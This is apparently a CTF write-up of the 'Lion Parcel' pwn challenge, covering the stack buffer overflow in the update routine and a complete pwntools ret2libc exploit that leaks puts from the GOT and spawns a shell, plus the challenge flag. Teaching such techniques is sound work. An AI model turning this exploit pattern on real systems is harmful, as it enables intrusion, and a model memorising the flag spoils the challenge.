---
slug: "pwn-lion-parcel"
title: "Lion Parcel"
competition: "Warmup PlayITplus"
category: "Pwn"
difficulty: "Easy"
date: "2026-11-07"
updated: "2026-11-07"
summary: "ret2libc but we have to pull the libc from docker manually."
tags: ["RET2LIBC","BUFFER OVERFLOW","GOT OVERWRITE"]
status: "published"
flag: "PLAYITPLUS{4ee458a53ab498aaa7958bb6855a55ef339917d48a0753c4e9b1fc868837396e}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-lion-parcel"
---

# Lion Parcel

> ret2libc but we have to pull the libc from docker manually.

## Challenge

-   **Poin / solves:** 500 / 2
    
-   **Deskripsi:** A quiet little parcel service lets you create, view and update records. What could possibly go wrong with a simple CRU program?
    
-   **File / service:** `nc 10.0.2.3 4268`
    

## Recon

We got these files:

```jsx
~/ctf/playit/pwn/lionparcel
❯ tree                                                                          󰥔 14:48:45
├── chall
├── docker-compose.yml
├── Dockerfile
└── flag.txt

1 directory, 4 files
```

After we checksec this challenge, the output that draw attention is `Partial RELRO`. Gratefully canary and PIE is disabled so the challenge will be easier.

```jsx
~/ctf/playit/pwn/lionparcel
❯ checksec chall                                                                󰥔 14:48:48
[*] '/home/claritys/ctf/playit/pwn/lionparcel/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Because `partial RELRO` make a vuln that we can overwrite the `GOT` (Global Offset Table), which is shared by the `libc`.

Let’s check the `Dockerfile`.

```jsx
~/ctf/playit/pwn/lionparcel
❯ cat Dockerfile                                                                󰥔 14:56:49
FROM ubuntu:24.04

RUN apt-get update && apt-get install -y --no-install-recommends socat \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /srv
COPY chall ./
COPY flag.txt /flag.txt
RUN chmod 0555 /srv/chall && chmod 0444 /flag.txt

USER 1000:1000
EXPOSE 1337
CMD ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:/srv/chall,stderr,pipes"]
```

The output is `FROM ubuntu:24.04`. We can take the libc after we compose up the docker.

Now the binary, let’s analyze this challenge, but first run this ELF.

![image.png](/assets/uploads/a888a4db-66e0-4ff3-9faa-27dff968e319-image.png)

So it have 4 option, create, view, update parcel, and exit.

Then it’s time to decompile it using IDA so we can know how this program works and search for the vulnerability.

## Vulnerability

The one which is catching my eye is `Bufferoverflow`. You can see it from the image.

![image.png](/assets/uploads/26afd201-2898-4337-b0e6-ed54259b3ca4-image-1.png)

Because the variable `s` only can store `128 bytes`, but we can input up to `512 bytes`. This thing can lead us to overwriting the return address, so we already can conclude the technique for solving this challenge. We will use ret2libc technique for this one.

## Exploit plan

Firstly, we have to take the libc from the docker, but deploy the docker first.

![image.png](/assets/uploads/80c8b1a9-537c-49b0-8c88-3c17d4ee8d5e-image-2.png)

We use this command to copy the libc from the docker to our computer.

```jsx
~/ctf/playit/pwn/lionparcel 2m 48s
❯ docker exec 49c395af3837 ldd /srv/chall                                       󰥔 15:49:56
        linux-vdso.so.1 (0x00007efda037b000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007efda015e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007efda037d000)
```

```jsx
~/ctf/playit/pwn
❯ docker cp pwn-lion_parcel-1:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6                                                                                                     󰥔 12:10:05
Successfully copied 2.13MB (transferred 2.13MB) to /home/claritys/ctf/playit/pwn/libc.so.6
```

Now we can patch the file so we can remote the solver to the challenge.

![image.png](/assets/uploads/5089feee-9d83-4d20-8a06-9ab710232a8d-image-3.png)

This is the full decompile:

```jsx
void vuln()
{
  __int64 v0; // rdx
  __int64 v1; // rbx
  __int64 v2; // rbx
  __int64 v3; // rbx
  __int64 v4; // rbx
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rdx
  __int64 v10; // rbx
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx
  __int64 v14; // rbx
  __int64 v15; // rbx
  __int64 v16; // rbx
  __int64 v17; // rbx
  char s[128]; // [rsp+0h] [rbp-A0h] BYREF
  int v19; // [rsp+80h] [rbp-20h] BYREF
  int v20; // [rsp+84h] [rbp-1Ch] BYREF
  unsigned int parcel_index; // [rsp+88h] [rbp-18h]
  int v22; // [rsp+8Ch] [rbp-14h]

  v22 = 1;
  while ( v22 )
  {
    putchar(10);
    puts("1. Create Parcel");
    puts("2. View Parcel");
    puts("3. Update Parcel");
    puts("4. Exit");
    printf("Choose an option: ");
    __isoc99_scanf("%d", &v20);
    getchar();
    if ( v20 == 4 )
    {
      puts("Exiting Lion Parcel. Goodbye!");
      v22 = 0;
    }
    else
    {
      if ( v20 > 4 )
        goto LABEL_17;
      switch ( v20 )
      {
        case 3:
          parcel_index = get_parcel_index("%d", (unsigned int)&v20);
          if ( (unsigned int)parcel_exists(parcel_index) )
          {
            v9 = 0x84LL * (int)parcel_index;
            v10 = *(_QWORD *)((char *)&parcel + v9 + 8);
            *(_QWORD *)s = *(_QWORD *)((char *)&parcel + v9);
            *(_QWORD *)&s[8] = v10;
            v11 = *(_QWORD *)((char *)&parcel + v9 + 24);
            *(_QWORD *)&s[16] = *(_QWORD *)((char *)&parcel + v9 + 16);
            *(_QWORD *)&s[24] = v11;
            v12 = *(_QWORD *)((char *)&parcel + v9 + 40);
            *(_QWORD *)&s[32] = *(_QWORD *)((char *)&parcel + v9 + 32);
            *(_QWORD *)&s[40] = v12;
            v13 = *(_QWORD *)((char *)&parcel + v9 + 56);
            *(_QWORD *)&s[48] = *(_QWORD *)((char *)&parcel + v9 + 48);
            *(_QWORD *)&s[56] = v13;
            v14 = *(_QWORD *)((char *)&parcel + v9 + 72);
            *(_QWORD *)&s[64] = *(_QWORD *)((char *)&parcel + v9 + 64);
            *(_QWORD *)&s[72] = v14;
            v15 = *(_QWORD *)((char *)&parcel + v9 + 88);
            *(_QWORD *)&s[80] = *(_QWORD *)((char *)&parcel + v9 + 80);
            *(_QWORD *)&s[88] = v15;
            v16 = *(_QWORD *)((char *)&parcel + v9 + 104);
            *(_QWORD *)&s[96] = *(_QWORD *)((char *)&parcel + v9 + 96);
            *(_QWORD *)&s[104] = v16;
            v17 = *(_QWORD *)((char *)&parcel + v9 + 120);
            *(_QWORD *)&s[112] = *(_QWORD *)((char *)&parcel + v9 + 112);
            *(_QWORD *)&s[120] = v17;
            v19 = *(_DWORD *)((char *)&parcel + v9 + 128);
            printf("Update recipient name: ");
            fgets(s, 32, stdin);
            printf("Update address: ");
            fgets(&s[32], 32, stdin);
            printf("Update contents: ");
            fgets(&s[64], 512, stdin);
            printf("Update weight: ");
            __isoc99_scanf("%d", &v19);
            puts("Parcel updated successfully!");
          }
          else
          {
LABEL_12:
            puts("No parcel found at this index!");
          }
          break;
        case 1:
          memset(s, 0, sizeof(s));
          v19 = 0;
          parcel_index = get_parcel_index((const char *)&v19, &v20, &v20);
          if ( (unsigned int)parcel_exists(parcel_index) )
          {
            puts("Parcel slot already occupied!");
          }
          else
          {
            printf("Enter recipient name: ");
            fgets(s, 32, stdin);
            printf("Enter address: ");
            fgets(&s[32], 32, stdin);
            printf("Enter contents: ");
            fgets(&s[64], 64, stdin);
            printf("Enter weight: ");
            __isoc99_scanf("%d", &v19);
            v0 = 132LL * (int)parcel_index;
            v1 = *(_QWORD *)&s[8];
            *(_QWORD *)((char *)&parcel + v0) = *(_QWORD *)s;
            *(_QWORD *)((char *)&parcel + v0 + 8) = v1;
            v2 = *(_QWORD *)&s[24];
            *(_QWORD *)((char *)&parcel + v0 + 16) = *(_QWORD *)&s[16];
            *(_QWORD *)((char *)&parcel + v0 + 24) = v2;
            v3 = *(_QWORD *)&s[40];
            *(_QWORD *)((char *)&parcel + v0 + 32) = *(_QWORD *)&s[32];
            *(_QWORD *)((char *)&parcel + v0 + 40) = v3;
            v4 = *(_QWORD *)&s[56];
            *(_QWORD *)((char *)&parcel + v0 + 48) = *(_QWORD *)&s[48];
            *(_QWORD *)((char *)&parcel + v0 + 56) = v4;
            v5 = *(_QWORD *)&s[72];
            *(_QWORD *)((char *)&parcel + v0 + 64) = *(_QWORD *)&s[64];
            *(_QWORD *)((char *)&parcel + v0 + 72) = v5;
            v6 = *(_QWORD *)&s[88];
            *(_QWORD *)((char *)&parcel + v0 + 80) = *(_QWORD *)&s[80];
            *(_QWORD *)((char *)&parcel + v0 + 88) = v6;
            v7 = *(_QWORD *)&s[104];
            *(_QWORD *)((char *)&parcel + v0 + 96) = *(_QWORD *)&s[96];
            *(_QWORD *)((char *)&parcel + v0 + 104) = v7;
            v8 = *(_QWORD *)&s[120];
            *(_QWORD *)((char *)&parcel + v0 + 112) = *(_QWORD *)&s[112];
            *(_QWORD *)((char *)&parcel + v0 + 120) = v8;
            *(_DWORD *)((char *)&parcel + v0 + 128) = v19;
            getchar();
            puts("Parcel created successfully!");
          }
          break;
        case 2:
          parcel_index = get_parcel_index("%d", (unsigned int)&v20);
          if ( !(unsigned int)parcel_exists(parcel_index) )
            goto LABEL_12;
          printf("Recipient: %s\n", (const char *)&parcel + 132 * (int)parcel_index);
          printf("Address: %s\n", (const char *)&parcel + 132 * (int)parcel_index + 32);
          printf("Contents: %s\n", (const char *)&parcel + 132 * (int)parcel_index + 64);
          printf("Weight: %d\n", dword_404120[33 * parcel_index]);
          break;
        default:
LABEL_17:
          puts("Invalid option! Please try again.");
          break;
      }
    }
  }
}
```

From there, we can write the `exploit` to leak `puts` (i just like `puts` better than `printf` or other hehe (you can use another function that is `@plt`)

Firstly we create parcel with random value that suiteable for the program, secondly we choose the same array that we create in the start, and then `EXIT` because exit make the `while loop` stops so we can back to the `main` and then `execute` the `return 0`.

![image.png](/assets/uploads/708a7dde-66e6-4665-ab26-cb64a9d1206c-image-4.png)

So we can make the leak like this:

```jsx
#!/usr/bin/env python3

from pwn import *

elf = ELF("chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf
context.terminal = ["ghostty", "-e"]
# Use the portable pwndbg bundle (/usr/local/bin/pwndbg) as the gdb pwntools launches.
# It ships its own gdb+python and loads pwndbg itself, so there is no gdbinit.py to source.
context.gdb_binary = "pwndbg"

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("10.0.2.3", 4268)

def main():
    r = conn()
    main = elf.sym['main']
    rdi = 0x0000000000401245
    pltputs = elf.sym['puts']
    gotputs = 0x404008
    payload1 = flat({168:[rdi, gotputs, pltputs, main]})
    r.sendlineafter(b'option: ', b'1')
    r.sendlineafter(b'): ', b'0')
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', b'4')
    r.sendlineafter(b'option: ', b'3')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b'weight: ', payload1)
    r.sendline(b'4')
    r.sendline(b'4')
if __name__ == "__main__":
    main()
```

Now let’s try to run it and then add the function to take and calculate the leak.

![image.png](/assets/uploads/f800a3c2-f2bd-45fd-b9d3-b0dd8ea99d2c-image-5.png)

Okay now we got the `leaked puts address`, now we calculate the leak for base libc address. Add these:

```jsx
    r.recvuntil(b'Goodbye!\n')
    leakputs = r.recvline().strip()
    putsleak = u64(leakputs.ljust(8, b'\x00'))
    log.success(f'dapet gini puts leaknya: {hex(putsleak)}')
    libc.address = putsleak - libc.sym['puts']
    log.success(f'dapet gini basenya: {hex(libc.address)}')
```

We got the correct base address, now we can exploit this challenge.

![image.png](/assets/uploads/88150c90-a1b2-4a4b-b6e4-7b23d2deb042-image-6.png)

We can add this payload:

```jsx
    ret = 0x000000000040101a
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']
    payload = flat({168:[ret, rdi, binsh, system]})
    r.sendlineafter(b'option: ', b'1')
    r.sendlineafter(b'): ', b'1')
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', b'4')
    r.sendlineafter(b'option: ', b'3')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b'weight: ', payload)
    r.sendline(b'4')
    r.sendline(b'4')
```

Then we can run it and just like that, we got the shell locally.

![image.png](/assets/uploads/b5033137-9369-4289-b792-b73c72967a2d-image-7.png)

Now lets do it remotely.

![image.png](/assets/uploads/750e6019-4fa3-4937-8c4f-fa8f01ab9917-image-8.png)

We got the final flag, solved.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf
context.terminal = ["ghostty", "-e"]
context.gdb_binary = "pwndbg"

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("10.0.2.3", 4268)

def main():
    r = conn()
    main = elf.sym['main']
    rdi = 0x0000000000401245
    pltputs = elf.sym['puts']
    gotputs = 0x404008
    payload1 = flat({168:[rdi, gotputs, pltputs, main]})
    r.sendlineafter(b'option: ', b'1')
    r.sendlineafter(b'): ', b'0')
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', b'4')
    r.sendlineafter(b'option: ', b'3')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b'weight: ', payload1)
    r.sendline(b'4')
    r.sendline(b'4')
    r.recvuntil(b'Goodbye!\n')
    leakputs = r.recvline().strip()
    putsleak = u64(leakputs.ljust(8, b'\x00'))
    log.success(f'dapet gini puts leaknya: {hex(putsleak)}')
    libc.address = putsleak - libc.sym['puts']
    log.success(f'dapet gini basenya: {hex(libc.address)}')
    ret = 0x000000000040101a
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']
    payload = flat({168:[ret, rdi, binsh, system]})
    r.sendlineafter(b'option: ', b'1')
    r.sendlineafter(b'): ', b'1')
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', b'4')
    r.sendlineafter(b'option: ', b'3')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b': ', b'awd')
    r.sendlineafter(b'weight: ', payload)
    r.sendline(b'4')
    r.sendline(b'4')
    # r.sendline(payload)

    # good luck pwning :)
    r.interactive()

if __name__ == "__main__":
    main()
```
